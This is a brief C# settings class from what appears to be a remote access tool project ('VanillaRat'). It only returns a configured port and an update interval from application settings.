namespace VanillaRat.Classes
{
    internal class Settings
    {
        public struct Values
        {
            //Get port from user settings
            public int GetPort()
            {
                return Properties.Settings.Default.Port;
            }

            //Get update interval from settings
            public int GetUpdateInterval()
            {
                return Properties.Settings.Default.UpdateInterval;
            }
        }
    }
}